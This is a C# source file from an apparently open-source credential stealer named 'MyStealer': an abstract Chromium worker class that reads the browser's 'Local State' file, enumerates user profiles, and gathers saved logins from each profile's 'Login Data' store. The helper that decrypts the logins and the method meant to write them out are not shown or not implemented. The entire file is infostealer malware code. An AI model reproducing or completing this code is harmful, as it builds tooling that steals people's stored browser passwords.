using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace MyStealer.Worker
{
    internal abstract partial class Chromium : IWorker
    {
        public string Name => nameof(Chromium);

        protected abstract string UserDataPath { get; }

        public bool Check() => File.Exists(Path.Combine(UserDataPath, "Local State"));
        public ISet<Credential> GetCredentials()
        {
            var set = new HashSet<Credential>();

            var localStateFile = Path.Combine(UserDataPath, "Local State");
            var localState = JObject.Parse(File.ReadAllText(localStateFile, encoding: Encoding.UTF8));
            foreach (var profileName in localState["profile"]["profiles_order"].Value<List<string>>())
            {
                foreach (var cred in GetLoginDatas(localStateFile, Path.Combine(UserDataPath, profileName, "Login Data")))
                    set.Add(cred);
            }

            return set;
        }

        public void Work(string destinationFile) => throw new System.NotImplementedException();
    }
}
